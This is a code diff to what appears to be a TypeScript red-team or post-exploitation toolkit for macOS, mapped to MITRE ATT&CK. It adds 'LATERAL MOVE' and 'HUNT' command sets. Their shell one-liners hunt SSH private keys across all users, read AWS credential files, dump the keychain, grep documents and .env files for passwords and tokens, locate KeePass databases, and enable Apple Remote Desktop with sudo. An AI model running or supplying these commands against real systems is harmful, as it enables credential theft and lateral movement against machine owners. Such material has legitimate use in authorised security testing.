@@ -73,6 +73,29 @@ const MODULES: Category[] = [
       { icon: '🧩', label: 'AMFI / nvram',               cmd: 'nvram boot-args 2>/dev/null; sysctl kern.amfiresult 2>/dev/null', tag: 'T1553' },
     ],
   },
+  {
+    id: 'lateral', icon: '↔️', label: 'LATERAL MOVE', atkId: 'TA0008',
+    cmds: [
+      { icon: '🔑', label: 'SSH Keys (all users)',   cmd: 'find /Users -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | xargs ls -la 2>/dev/null; cat /Users/*/.ssh/known_hosts 2>/dev/null', tag: 'T1021' },
+      { icon: '📡', label: 'SSH Agent Keys',         cmd: 'ssh-add -l 2>/dev/null || echo no-agent; echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"', tag: 'T1021' },
+      { icon: '🌐', label: 'ARD / Screen Sharing',   cmd: 'sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate 2>/dev/null; defaults read /Library/Preferences/com.apple.ScreenSharing 2>/dev/null', tag: 'T1021' },
+      { icon: '📁', label: 'Mounted Shares',         cmd: 'mount | grep -E "smbfs|afpfs|nfs"; ls /Volumes/ 2>/dev/null',                  tag: 'T1135' },
+      { icon: '🔍', label: 'Bonjour Services',       cmd: 'dns-sd -B _services._dns-sd._udp local 2>/dev/null & sleep 3; kill %1 2>/dev/null', tag: 'T1046' },
+      { icon: '🔐', label: 'Keychain SSH Keys',      cmd: 'security find-generic-password -a $(whoami) -s "SSH" -w 2>/dev/null; security dump-keychain | grep -A4 "SSH" | head -20', tag: 'T1555' },
+    ],
+  },
+  {
+    id: 'hunt', icon: '🎯', label: 'HUNT', atkId: 'TA0009',
+    cmds: [
+      { icon: '🔑', label: 'Hunt SSH Keys',          cmd: 'find /Users -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.ppk" 2>/dev/null | head -20', tag: 'T1552' },
+      { icon: '🌐', label: 'Hunt AWS / Cloud Creds', cmd: 'cat /Users/*/.aws/credentials /Users/*/.aws/config 2>/dev/null; find /Users -name "credentials" -path "*/.aws/*" 2>/dev/null', tag: 'T1552' },
+      { icon: '💾', label: 'Hunt DB Files',          cmd: 'find /Users /opt /var -name "*.db" -o -name "*.sqlite" 2>/dev/null | grep -v proc | head -20', tag: 'T1005' },
+      { icon: '📄', label: 'Hunt Passwords',         cmd: 'grep -rli "password\\|passwd\\|secret\\|api_key\\|token" /Users/*/Documents /Users/*/Desktop 2>/dev/null | head -20', tag: 'T1552' },
+      { icon: '🔐', label: 'Hunt KeePass',           cmd: 'find /Users -name "*.kdbx" -o -name "*.kdb" 2>/dev/null | head -10',           tag: 'T1552' },
+      { icon: '🐳', label: 'Hunt Docker Secrets',    cmd: 'find /Users -name "docker-compose*.yml" -o -name ".env" 2>/dev/null | xargs grep -l "password\\|secret" 2>/dev/null | head -10', tag: 'T1552' },
+      { icon: '🍎', label: 'Hunt iCloud / Keychain', cmd: 'find /Users/*/Library/Keychains -name "*.db" 2>/dev/null | head -10; ls /Users/*/Library/Mobile\\ Documents 2>/dev/null', tag: 'T1555' },
+    ],
+  },
 ]
 
 function joinUnix(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
